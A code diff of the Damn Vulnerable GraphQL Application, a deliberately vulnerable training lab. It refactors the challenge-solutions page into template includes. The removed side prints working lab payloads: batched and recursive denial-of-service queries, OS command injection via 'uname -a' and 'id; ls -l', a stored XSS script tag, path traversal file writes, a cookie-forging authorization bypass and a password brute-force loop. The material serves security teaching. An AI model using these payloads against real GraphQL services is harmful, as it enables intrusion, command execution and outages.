@@ -1,688 +1,170 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-    <meta name="description" content="Damn Vulnerable GraphQL Application">
-    <meta name="author" content="Dolev F.">
-    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}">
-    <link rel="stylesheet" href="/static/all.css">
-    <link rel="stylesheet" href="/static/extra.css" />
-
-    <title>Damn Vulnerable GraphQL Application</title>
-
-    <link href="/static/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
-    <link href="/static/simple-sidebar.css" rel="stylesheet" />
-    <link rel="stylesheet" href="/static/extra.css">
-</head>
-
-<body>
-    <div class="d-flex" id="wrapper">
-        {% include 'sidebar.html' %}
-        <!-- /#sidebar-wrapper -->
-
-        <!-- Page Content -->
-        <div id="page-content-wrapper">
-            {% include 'navbar.html' %}
-            <div class="container-fluid">
-                <h1 class="mt-4">Challenge Solutions</h1>
-                <hr />
-                <div class="row">
-                    <div class="col-md-12">
-                        <div class="card">
-                            <div class="card-header"><b>Solutions</b></div>
-                            <div class="card-body">
-                                <div id="toc_container">
-                                    <p class="toc_title">Table of Contents</p>
-                                    <ul class="toc_list">
-                                        <li>
-                                            <b>Denial of Service</b>
-                                            <ul>
-                                                <li>
-                                                    <a href="#dos-batch">Batch Query Attack</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#dos-recursion">Deep Recursion Query Attack</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#dos-intensive">Resource Intensive Query Attack</a>
-                                                </li>
-                                            </ul>
-                                        </li>
-
-                                        <li>
-                                            <b>Information Disclosure</b>
-                                            <ul>
-                                                <li>
-                                                    <a href="#info-introspection">GraphQL Introspection</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#info-igql">GraphQL Interface</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#info-suggestions">GraphQL Field Suggestions</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#info-ssrf">Server Side Request Forgery</a>
-                                                </li>
-                                            </ul>
-                                        </li>
-                                        <li>
-                                            <b>Code Execution</b>
-                                            <ul>
-                                                <li>
-                                                    <a href="#exec-os-1">OS Command Injection #1</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#exec-os-2">OS Command Injection #2</a>
-                                                </li>
-                                            </ul>
-                                        </li>
-                                        <li>
-                                            <b>Injection</b>
-                                            <ul>
-                                                <li>
-                                                    <a href="#inj-xss">Stored Cross Site Scripting</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#inj-html">HTML Injection</a>
-                                                </li>
-                                            </ul>
-                                        </li>
-                                        <li>
-                                            <b>Authorization Bypass</b>
-                                            <ul>
-                                                <li>
-                                                    <a href="#bypassauthz-igql">GraphQL Interface Protection Bypass</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#bypassauthz-denylist">GraphQL Query Deny List Bypass</a>
-                                                </li>
-                                            </ul>
-                                        </li>
-                                        <li>
-                                            <b>Miscellaneous</b>
-                                            <ul>
-                                                <li>
-                                                    <a href="#misc-weakpass">GraphQL Query Weak Password Protection</a>
-                                                </li>
-                                                <li>
-                                                    <a href="#misc-filewrite">Arbitrary File Write // Path Traversal</a>
-                                                </li>
-                                            </ul>
-                                        </li>
-                                    </ul>
-                                </div>
-                            </div>
-
-                            <div class="card-body">
-                                <h3 style="color:purple" id="dos-batch"><b>Overview</b></h3>
-                                <hr />
-                                <h4>Legend</h4>
-                                <ul>
-                                    <li><i class="fa fa-newspaper"></i> - GraphQL Official Documentation / Blog Posts</li>
-                                    <li><i class="fa fa-code"></i> - Code Snippet</li>
-                                    <li><i class="fa fa-shield-alt"></i> - GraphQL Security Utility</li>
-                                    <li><i class="fa fa-bug"></i> - Published Vulnerability (H1, CVE, etc.)</li>
-                                </ul>
-
-                                <p><small style="color:grey"><i class="fa fa-info"></i> &nbsp; There may be more than one way to exploit any given vulnerability, the solutions demonstrated below aim to illustrate one way of achieving successful exploitation.</small><br>
-                                    <small style="color:grey"><i class="fa fa-info"></i> &nbsp; Some solutions include code snippets that are written in Python and use the requests library for HTTP requests.</small></p>
-                                <br>
-                                <br>
-                                <!-- Start -->
-                                <h3 style="color:purple" id="dos-batch"><b>Denial of Service :: Batch Query Attack</b></h3>
-                                <hr />
-                                <h5>Problem Statement</h5>
-                                <p>GraphQL supports Request Batching. Batched requests are processed one after the other by GraphQL, which makes it a good candidate for Denial of Service attacks, as well as other attacks such as Brute Force and Enumeration.</p>
-                                <p>If a resource intensive GraphQL query is identified, an attacker may leverage batch processing to call the query and potentially overwhelm the service for a prolonged period of time.</p>
-                                <p>The query <code>systemUpdate</code> seems to be taking a long time to complete, and can be used to overwhelm the server by batching a system update request query.</p>
-                                <h5>Resources</h5>
-                                <ul>
-                                    <li><a href="https://www.apollographql.com/blog/batching-client-graphql-queries-a685f5bcd41b/" target="_blank"><i class="fa fa-newspaper"></i> Apollo Blog - Batching Client GraphQL Queries</a></li>
-                                    <li><a href="https://lab.wallarm.com/graphql-batching-attack/" target="_blank"><i class="fa fa-newspaper"></i>  Wallarm Blog - GraphQL Batching Attack</a></li>
-                                </ul>
-
-                                <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-batch')">Show</button></h5>
-                                <div id="sol-dos-batch" style="display:none">
-                                    <pre class="bash">
-# Beginner mode
-
-# We chain multiple resource intensive queries in an array and pass it to GraphQL
-data = [
-  {"query":"query {\n  systemUpdate\n}","variables":[]},
-  {"query":"query {\n  systemUpdate\n}","variables":[]},
-  {"query":"query {\n  systemUpdate\n}","variables":[]}
-]
-
-requests.post('http://host/graphql', json=data)
-
-# Expert mode
-
-# Cost Query Analysis is enabled, which should prevent running batched system updates from going through.
-</pre>
-                                </div>
-                                <!-- End -->
-                                <br>
-                                <!-- Start -->
-                                <h3 id="dos-recursion" style="color:purple"><b>Denial of Service :: Deep Recursion Query Attack</b></h3>
-                                <hr />
-                                <h5>Problem Statement</h5>
-                                <p>In GraphQL, when types reference eachother, it is often possible to build a circular query that grows exponentially to a point it could bring the server down to its knees. Countermeasures such as <code>max_depth</code>                                    can help mitigate these types of attacks.</p>
-                                <p>The <code>max_depth</code> functionality acts as a safeguard, and defines how deep a query can get, ensuring deeply constructed queries will not be accepted by GraphQL.</p>
-                                <p>The application offers two types, namely <code>Owner</code> and <code>Paste</code>, which reference eachother (an owner has a paste, and a paste has an owner), allowing a recursive query to be executed successfully.
-                                    <h5>Resources</h5>
-                                    <ul>
-                                        <li><a href="https://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries-16130a324a6b/" target="_blank"><i class="fa fa-newspaper"></i>  Securing GraphQL API - Apollo</a></li>
-                                        <li><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/30096" target="_blank"><i class="fa fa-bug"></i>  GitLab Issue #30096</a></li>
-                                    </ul>
-
-                                    <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-recursion')">Show</button></h5>
-                                    <div style="display:none" id="sol-dos-recursion">
-                                        <pre class="bash">
-# Beginner mode:
-
-query {
- pastes {
-  owner {
-   paste {
-    edges {
-     node {
-      title
-      owner {
-       paste {
-        edges {
-         node {
-          owner {
-           paste {
-            edges {
-             node {
-              owner {
-               id
-              }
-             }
-            }
-           }
-          }
-         }
-        }
-       }
-      }
-     }
-    }
-   }
-  }
- }
-}
-
-# Expert mode
-
-# A depth check is implemented which should prevent malicious queries from going through.
-
-</div>
-            </pre>
-                                        <!-- End -->
-                                        <br>
-                                        <br>
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="dos-intensive"><b>Denial of Service :: Resource Intensive Query Attack</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>Sometimes, certain queries may be computationally more expensive than others. A query may include certain fields that would trigger more complex backend logic in order to fulfill the query resolution. As attackers,
-                                            we can abuse it by calling these actions frequently in order to cause resource exhaustion.</p>
-                                        <p>In GraphQL, a concept called Query Cost Analysis exists, which assigns weight values to fields that are more expensive to resolve than others. Using this feature, we can then create an upper threshold to reject
-                                            queries that are expensive. Alternatively, a cache feature can be implemented to avoid repeating the same request in a short time window.</p>
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li><a href="https://graphql-ruby.org/queries/complexity_and_depth.html" target="_blank"><i class="fa fa-newspaper"></i> Ruby GraphQL - Complexity and Depth</a></li>
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-intensive')">Show</button></h5>
-                                        <div id="sol-dos-intensive" style="display:none">
-                                            <pre class="bash">
-# Beginner mode
-
-# We measure the amount of time it takes a query to finish
-import time
-
-start = time.time()
-requests.post('http://host/graphql',
-              json={"query":"query {\n  systemUpdate\n}","variables":[]})
-end = time.time()
-
-print('Execution Time :: {} seconds'.format(end - start))
-
-# Execution Time :: 81.95908403396606 seconds
-
-
-# Expert mode
-
-# A Query Cost Analysis protection is implemented which should prevent bulk system updates!</pre>
-                                        </div>
-                                        <!-- End -->
-                                        <br>
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="info-introspection"><b>Information Disclosure :: GraphQL Introspection</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>GraphQL Introspection is a special query that uses the <code>__schema</code> field to interrogate GraphQL for its schema.</p>
-                                        <p>Introspection in itself is not a weakness, but a feature. However, if it is made available, it can be used and abused by attackers seeking information about your GraphQL implementation, such as what queries or mutations
-                                            exist.
-                                        </p>
-                                        <p>It is recommended to disable introspection in production to avoid data leakages.</p>
-                                        <p>Note: If introspection query is disabled, attackers may fall back to using the <b>Field Suggestion</b> feature to understand what queries and fields are supported by your GraphQL. Refer to <a href="#info-suggestions">Information Disclosure :: GraphQL Field Suggestions</a>                                            attack for more information.</p>
-
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li><a href="https://graphql.org/learn/introspection/" target="_blank"><i class="fa fa-newspaper"></i> GraphQL - Introspection</a></li>
-                                            <li><a href="https://graphql-ruby.org/schema/introspection" target="_blank"><i class="fa fa-newspaper"></i> Ruby GraphQL - Introspection Guide</a></li>
-                                            <li><a href="https://github.com/szki/shapeshifter" target="_blank"><i class="fa fa-shield-alt"></i> ShapeShifter - GQL Security tool for Schema Extraction</a></li>
-                                            <li><a href="https://github.com/nikitastupin/clairvoyance" target="_blank"><i class="fa fa-shield-alt"></i> Clairvoyance - GraphQL Schema Enumeration Discovery Tool</a></li>
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-introspection')">Show</button></h5>
-                                        <div id="sol-info-introspection" style="display:none">
-                                            <pre class="bash">
-# Beginner mode
-
-# Navigate to http://host/igraphql
-# Run Introspection query
-
-query {
-  __schema {
-    queryType { name }
-    mutationType { name }
-    subscriptionType { name }
-  }
-}
-
-
-# Expert mode
-
-# Introspection is disabled, enumeration of fields and dynamic testing is required to understand the structure of the application.
-              </div>
-              <!-- End -->
-
-            <br>
-              <!-- Start -->
-            <h3 style="color:purple" id="info-igql"><b>Information Disclosure :: GraphQL Interface</b></h3>
-              <hr />
-              <h5>Problem Statement</h5>
-              <p>GraphQL has a an Integrated Development Environment named <code>GraphiQL</code> (note the <code>i</code>) that allows constructing queries in a friendly user interface.</p>
-              <p>GraphiQL is usually found in paths such as: <code>/graphiql</code> or <code>__graphiql</code>, however, it can be in other places too. You can use this <a href="https://github.com/dolevf/nmap-graphql-introspection-nse/blob/6594cce7b590a7194641494ed33c018d9ecd6b89/graphql-introspection.nse#L47" target="_blank">Nmap NSE script</a> to enumerate GraphiQL endpoints.</p>
-              <h5>Resources</h5>
-              <ul>
-                <li><a href="https://www.apollographql.com/docs/apollo-server/v1/graphiql/" target="_blank"><i class="fa fa-newspaper"></i> Apollo GraphiQL</a></li>
-                <li><a href="https://www.gatsbyjs.com/docs/how-to/querying-data/running-queries-with-graphiql/" target="_blank"><i class="fa fa-newspaper"></i> Gatsby on GraphiQL</a></li>
-              </ul>
-              <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-igql')">Show</button></h5>
-              <div id="sol-info-igql" style="display:none">
-              <pre class="bash">
-# Beginner mode
-
-# Browse to http://host/graphiql
-
-# Expert mode
-
-# GraphiQL will be disabled.
-</pre>
-                                        </div>
-                                        <!-- End -->
-
-                                        <br>
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="info-suggestions"><b>Information Disclosure :: GraphQL Field Suggestions</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>GraphQL has a feature for field and operation suggestions. When a developer wants to integrate with a GraphQL API and types an incorrect field, as an example, GraphQL will attempt to suggest nearby fields that are
-                                            similar.
-                                        </p>
-                                        <p>Field suggestions is not a vulnerability in itself, but a feature that can be abused to gain more insight into GraphQL's schema, especially when Introspection is not allowed.</p>
-
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li>
-                                                <a href="https://github.com/graphql-python/graphql-core/blob/7d826f0ec0a447cb869dfb891a755dbe8ea9b66f/src/graphql/validation/rules/fields_on_correct_type.py#L23" target="_blank"> <i class="fa fa-code"></i> Python's graphql-core suggestion feature</a>
-                                            </li>
-                                            <li><a href="https://graphql-ruby.org/schema/introspection" target="_blank"><i class="fa fa-newspaper"></i> GraphQL Introspection</a></li>
-                                            <li><a href="https://github.com/nikitastupin/clairvoyance" target="_blank"><i class="fa fa-shield-alt"></i> Clairvoyance - GQL Security tool for field enumeration</a></li>
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-suggestions')">Show</button></h5>
-                                        <div id="sol-info-suggestions" style="display:none">
-                                            <pre class="bash">
-# Beginner and Expert modes
-
-# Supplying incorrect fields will trigger GraphQL to disclose fields with similar names
-query {
-  system
-}
-
->>> Response:
-{
-  "errors": [
-    {
-      "message": "Cannot query field \"system\" on type \"Query\". Did you mean \"pastes\", \"paste\", \"systemUpdate\" or \"systemHealth\"?",
-      "locations": [
-        {
-          "line": 2,
-          "column": 3
-        }
-      ]
-    }
-  ]
-}
-</pre>
-                                        </div>
-                                        <!-- End -->
-                                        <br>
-
-                                        <br>
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="info-ssrf"><b>Information Disclosure :: Server Side Request Forgery</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>The GraphQL mutation <code>importPaste</code> accepts arbitrary host, port and scheme to import pastes from and does not restrict input such as localhost or other internal servers from being used. This may allow
-                                            forging requests on behalf of the application server to target other network nodes.</p>
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li><a href="https://portswigger.net/web-security/ssrf" target="_blank"><i class="fa fa-newspaper"></i> PortSwigger - Server Side Request Forgery</a></li>
-                                            <li><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank"><i class="fa fa-newspaper"></i> OWASP - Server Side Request Forgery</a></li>
-
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-ssrf')">Show</button></h5>
-                                        <div id="sol-info-ssrf" style="display:none">
-                                            <pre class="bash">
-# Beginner and Expert modes
-
-# Any arbitrary host and ports can be used to make an outbound HTTP request
-mutation {
-  importPaste(host:"localhost", port:57130, path:"/", scheme:"http")
-}
-</pre>
-                                        </div>
-                                        <!-- End -->
-                                        <br>
-
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="exec-os-1"><b>Code Execution :: OS Command Injection #1</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>The mutation <code>importPaste</code> allows escaping from the parameters and introduce a UNIX command by chaining commands. The GraphQL resolver does not sufficiently validate the input, and passes it directly
-                                            into <code>cURL</code>.</p>
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li><a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank"><i class="fa fa-newspaper"></i> OWASP - Command Injection</a></li>
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-exec-os-1')">Show</button></h5>
-                                        <div id="sol-exec-os-1" style="display:none">
-                                            <pre class="bash">
-# Beginner mode
-
-# Import Paste allows specifying UNIX characters to break out of the URL provided to importPaste, using characters such as ";" "&&", "||", and more.
-mutation  {
-  importPaste(host:'localhost', port:80, path:"/ ; uname -a", scheme:"http"){
-    result
-  }
-}
-
-# Expert mode
-
-# Import Paste filters characters such as ";" and "&" but not "|", if you manage to cause the import to fail, you can double pipe it to a command that will execute in the context of the operating system.
-mutation {
-  importPaste(host:"hostthatdoesnotexist.com", port:80, path:"/ || uname -a", scheme:"http") {
-    result
-  }
-}
-</pre>
-                                        </div>
-                                        <!-- End -->
-                                        <br>
-
-                                        <h3 style="color:purple" id="exec-os-2"><b>Code Execution :: OS Command Injection #2</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>The query <code>systemDiagnostics</code> accepts certain UNIX binaries as parameters for debugging purposes, such as <code>whoami</code>, <code>ps</code>, etc. It acts as a restricted shell. However, it is protected
-                                            with a username and password. After obtaining the <a href="http://127.0.0.1:5000/solutions#misc-weakpass">correct credentials</a>, the restricted shell seems to be bypassable by chaining commands together.</p>
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li><a href="https://www.netsparker.com/blog/web-security/command-injection-vulnerability/" target="_blank"><i class="fa fa-newspaper"></i> Netsparker - Command Injection</a></li>
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-exec-os-2')">Show</button></h5>
-                                        <div id="sol-exec-os-2" style="display:none">
-                                            <pre class="bash">
-
-# System Diagnostics suffers from weak restricted shell implementation
-
-query {
-  systemDiagnostics(username:"admin", password:"password", cmd:"id")
-}
-
->>> Response:
-{
-  "data": {
-    "systemDiagnostics": "id: command not found"
-  }
-}
-}
-
-
-query {
-  systemDiagnostics(username:"admin", password:"password", cmd:"id; ls -l")
-
->>> Response:
-{
-  "data": {
-    "systemDiagnostics": "total 128\ndrwxr-xr- .. COLORTERM=truecolor\n_=/usr/bin/env\n"
-  }
-}</pre>
-                                        </div>
-                                        <!-- End -->
-                                        <br>
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="inj-xss"><b>Injection :: Stored Cross Site Scripting</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>The GraphQL mutations <code>createPaste</code> and <code>importPaste</code> allow creating and importing new pastes. The pastes may include any character without any restrictions. The pastes would then render in
-                                            the Public and Private paste pages, which would result in a Cross Site Scripting vulnerability (XSS).</p>
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li><a href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank"><i class="fa fa-newspaper"></i> PortSwigger - Stored Cross Site Scripting</a></li>
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-xss')">Show</button></h5>
-                                        <div id="sol-inj-xss" style="display:none">
-                                            <pre class="bash">
-# Create New Paste allows special characters that would render in HTML.
-mutation {
-  createPaste(title:"&lt;script&gt;alert(1)&lt;/script&gt;", content:"zzzz", public:true) {
-     pasteId
-   }
-}
-
-# Alternatively, importing a paste that includes Javascript will also result in the same behaviour.
-mutation {
-  importPaste(host:"localhost", port:80, path:"/xss.html"")
-}</pre>
-                                        </div>
-                                        <!-- End -->
-                                        <br>
-
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="inj-xss"><b>Injection :: HTML Injection</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>Similarly to the Cross Site Scripting problem, a paste can also include HTML tags that would render in the application, resulting in an HTML injection.</p>
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li><a href="https://www.acunetix.com/blog/web-security-zone/html-injections/" target="_blank"><i class="fa fa-newspaper"></i> Acunetix - HTML Injection</a></li>
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-html')">Show</button></h5>
-                                        <div id="sol-inj-html" style="display:none">
-                                            <pre class="bash">
-# Create New Paste allows inserting HTML tags
-mutation {
-  createPaste(title:"&lt;h1&gt;hello!&lt;/h1&gt;", content:"zzzz", public:true) {
-     pasteId
-   }
-}
-
-# Content of HTML_Injection.html 
-# &lt;h1&gt; Hello &lt;/h1&gt;!
-mutation {
-  importPaste(host:"localhost", port:80, path:"/HTML_Injection.html"")
-}
-
-</pre>
-                                        </div>
-                                        <!-- End -->
-                                        <br>
-
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="authzbypass-igql"><b>Authorization Bypass :: GraphQL Interface Protection Bypass</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>GraphiQL is available at the path <code>/graphiql</code> with a poorly implemented authorization check.</p>
-                                        <h5>Resources</h5>
-                                        <ul>
-                                            <li><a href="https://cwe.mitre.org/data/definitions/639.html" target="_blank"><i class="fa fa-newspaper"></i> CWE-639 - Authorization Bypass Through User-Controlled Key</a></li>
-                                        </ul>
-                                        <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-igql')">Show</button></h5>
-                                        <div id="sol-brokenauthz-igql" style="display:none">
-                                            <pre class="bash">
-# Beginner mode
-
-# Cookie 'env' stores a base64 encoded string with an instruction to disable graphiql. re-encoding with graphiql:enable bypasses the protection
-Z3JhcGhpcWw6ZGlzYWJsZQ==  - graphiql:disable
-
-# Specify a cookie that decodes to graphiql:enable to bypass this check:
-requests.post('http://host/graphiql',
-              json={"query":"query IntrospectionQuery{__schema {queryType { name } mutationType { name } subscriptionType { name }}}"},
-              cookies={'env':'Z3JhcGhpcWw6ZW5hYmxl'})
-
-# Expert mode
-# GraphiQL interface is disabled.
-</pre>
-                                        </div>
-                                        <!-- End -->
-                                        <br>
-
-                                        <!-- Start -->
-                                        <h3 style="color:purple" id="bypassauthz-denylist"><b>GraphQL Query Deny List Bypass</b></h3>
-                                        <hr />
-                                        <h5>Problem Statement</h5>
-                                        <p>Creating an <b>allow-list</b> or <b>deny-list</b> for GraphQL is a common technique to prevent malicious queries from being resolved by GraphQL.</p>
-                                        <ul>
-                                            <li>By defining an <b>allow-list</b>, the application server will have a "known good" queries it will allow, and reject anything else.</li>
-                                            <li>By defining a <b>deny-list</b>, the application server will have a "known bad" queries it will reject, and allow anything else.</li>
-                                        </ul>
-                                        <p>In general, the allow-list approach is easier to maintain and less error-prone, since we only allow certain things we trust. It does not mean it cannot have flaws too.</p>
-                                        <p>The application has a deny-list mechanism implemented that attempts to reject Health queries using the <code>systemHealth</code> query.
-                                            <p>The problem with this mechanism is that it does not take into consideration queries can have <a href="https://graphql.org/learn/queries/#operation-name" target="_blank">operation names</a>.</p>
-                                            <h5>Resources</h5>
-                                            <ul>
-                                                <li><a href="https://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries-16130a324a6b/" target="_blank"><i class="fa fa-newspaper"></i> Apollo - Securing your GraphQL From Malicious Queries </a></li>
-                                                <li><a href="https://cwe.mitre.org/data/definitions/184.html" target="_blank"><i class="fa fa-newspaper"></i> CWE-184: Incomplete List of Disallowed Inputs </a></li>
-                                            </ul>
-                                            <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-denylist')">Show</button></h5>
-                                            <div id="sol-brokenauthz-denylist" style="display:none">
-                                                <pre class="bash">
-# Expert mode
-
-# Query systemHealth directly by calling /graphql and supplying an arbitrary operation name.
-
-requests.post('http://host/graphql', json={"query":"query BypassMe{systemHealth}"}, headers={'X-DVGA-MODE':'Expert'})
-
-</pre>
-                                            </div>
-                                            <!-- End -->
-                                            <br>
-
-                                            <!-- Start -->
-                                            <h3 style="color:purple" id="misc-filewrite"><b>Miscellaneous :: Arbitrary File Write // Path Traversal</b></h3>
-                                            <hr />
-                                            <h5>Problem Statement</h5>
-                                            <p>The mutation <code>uploadPaste</code> allows uploading pastes from the user's computer by specifying the file along with the filename. The pastes are then stored on the server under a dedicated folder. The <code>filename</code>                                                argument allows any string, effectively providing the ability to write the file to any location on the server's filesystem by traversing folders using <code>../../</code></p>
-                                            <h5>Resources</h5>
-                                            <ul>
-                                                <li><a href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank"><i class="fa fa-newspaper"></i> OWASP - Path Traversal</a></li>
-                                            </ul>
-                                            <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-misc-filewrite')">Show</button></h5>
-                                            <div id="sol-misc-filewrite" style="display:none">
-                                                <pre class="bash">
-# Traverse the filesystem and place the file where you desire.
-mutation {
-  uploadPaste(filename:"../../../../../tmp/file.txt", content:"hi"){
-    result
-  }
-}</pre>
-                                            </div>
-                                            <!-- End -->
-                                            <br>
-
-                                            <!-- Start -->
-                                            <h3 style="color:purple" id="misc-weakpass"><b>Miscellaneous :: GraphQL Query Weak Password Protection</b></h3>
-                                            <hr />
-                                            <h5>Problem Statement</h5>
-                                            <p>The query <code>systemDiagnostics</code> is an administrative functionality that allows running a subset of system commands on the server. The query is governed by a username and password before processing the
-                                                command.
-                                            </p>
-                                            <p>The password is weak, and the server has no rate limiting protections. This allows attackers to easily conduct brute force attacks against the server.</p>
-                                            <h5>Resources</h5>
-                                            <ul>
-                                                <li><a href="https://cwe.mitre.org/data/definitions/307.html" target="_blank"><i class="fa fa-newspaper"></i> CWE-307 - Improper Restriction of Excessive Authentication Attempts</a></li>
-                                            </ul>
-                                            <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-misc-weakpass')">Show</button></h5>
-                                            <div id="sol-misc-weakpass" style="display:none">
-                                                <pre class="bash">
-# Brute Force attack with a list of passwords:
-passwordlist = ['admin123', 'pass123', 'adminadmin', '123']
-
-for password in passwordlist:
-  resp = requests.post('http://host/graphql',
-                      json={
-                            "query":"query {\n  systemDiagnostics(username:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),
-                            "variables":None
-                          })
-  if not 'errors' in resp.text:
-     print('Password is', password)
-
-</pre>
-                                            </div>
-                                            <!-- End -->
-                                            <br>
-
-                                    </div>
-                            </div>
-                        </div>
-                    </div>
+{% extends 'partials/base.html' %}
+
+{% block header %}
+  {% include 'partials/base_header.html' %}
+{% endblock %}
+
+{% block content %}
+  <!-- Page Content -->
+  <div id="page-content-wrapper">
+    {% include 'partials/navbar.html' %}
+    <div class="container-fluid">
+      <h1 class="mt-4">Challenge Solutions</h1>
+      <hr />
+      <div class="row">
+        <div class="col-md-12">
+          <div class="card">
+            <div class="card-header"><b>Solutions</b></div>
+            <div class="card-body">
+              <div id="toc_container">
+                <p class="toc_title">Table of Contents</p>
+                  <ul class="toc_list">
+                    <li>
+                      <b>Denial of Service</b>
+                      <ul>
+                        <li>
+                          <a href="#dos-batch">Batch Query Attack</a>
+                        </li>
+                        <li>
+                          <a href="#dos-recursion">Deep Recursion Query Attack</a>
+                        </li>
+                        <li>
+                          <a href="#dos-intensive">Resource Intensive Query Attack</a>
+                        </li>
+                      </ul>
+                    </li>
+
+                    <li>
+                      <b>Information Disclosure</b>
+                      <ul>
+                        <li>
+                          <a href="#info-introspection">GraphQL Introspection</a>
+                        </li>
+                        <li>
+                          <a href="#info-igql">GraphQL Interface</a>
+                        </li>
+                        <li>
+                          <a href="#info-suggestions">GraphQL Field Suggestions</a>
+                        </li>
+                        <li>
+                          <a href="#info-ssrf">Server Side Request Forgery</a>
+                        </li>
+                      </ul>
+                    </li>
+                    <li>
+                      <b>Code Execution</b>
+                      <ul>
+                        <li>
+                          <a href="#exec-os-1">OS Command Injection #1</a>
+                        </li>
+                        <li>
+                          <a href="#exec-os-2">OS Command Injection #2</a>
+                        </li>
+                      </ul>
+                    </li>
+                    <li>
+                      <b>Injection</b>
+                      <ul>
+                        <li>
+                          <a href="#inj-xss">Stored Cross Site Scripting</a>
+                        </li>
+                        <li>
+                          <a href="#inj-html">HTML Injection</a>
+                        </li>
+                      </ul>
+                    </li>
+                    <li>
+                      <b>Authorization Bypass</b>
+                      <ul>
+                        <li>
+                          <a href="#bypassauthz-igql">GraphQL Interface Protection Bypass</a>
+                        </li>
+                        <li>
+                          <a href="#bypassauthz-denylist">GraphQL Query Deny List Bypass</a>
+                        </li>
+                      </ul>
+                    </li>
+                    <li>
+                      <b>Miscellaneous</b>
+                      <ul>
+                        <li>
+                          <a href="#misc-weakpass">GraphQL Query Weak Password Protection</a>
+                        </li>
+                        <li>
+                          <a href="#misc-filewrite">Arbitrary File Write // Path Traversal</a>
+                        </li>
+                      </ul>
+                    </li>
+                  </ul>
                 </div>
+              </div>
+
+            <div class="card-body">
+              <h3 style="color:purple" id="dos-batch"><b>Overview</b></h3>
+              <hr />
+              <h4>Legend</h4>
+              <ul>
+                <li><i class="fa fa-newspaper"></i> - GraphQL Official Documentation / Blog Posts</li>
+                <li><i class="fa fa-code"></i> - Code Snippet</li>
+                <li><i class="fa fa-shield-alt"></i> - GraphQL Security Utility</li>
+                <li><i class="fa fa-bug"></i> - Published Vulnerability (H1, CVE, etc.)</li>
+              </ul>
+
+              <p>
+                <small style="color:grey"><i class="fa fa-info"></i> &nbsp; There may be more than one way to exploit any given vulnerability, the solutions demonstrated below aim to illustrate one way of achieving successful exploitation.</small>
+                <br>
+                <small style="color:grey"><i class="fa fa-info"></i> &nbsp; Some solutions include code snippets that are written in Python and use the requests library for HTTP requests.</small>
+              </p>
+              <br>
+              {% include 'partials/solutions/solution_1.html' %}
+              <br>
+              {% include 'partials/solutions/solution_2.html' %}
+              <br>
+              {% include 'partials/solutions/solution_3.html' %}
+              <br>
+              {% include 'partials/solutions/solution_4.html' %}
+              <br>
+              {% include 'partials/solutions/solution_5.html' %}
+              <br>
+              {% include 'partials/solutions/solution_6.html' %}
+              <br>
+              {% include 'partials/solutions/solution_7.html' %}
+              <br>
+              {% include 'partials/solutions/solution_8.html' %}
+              <br>
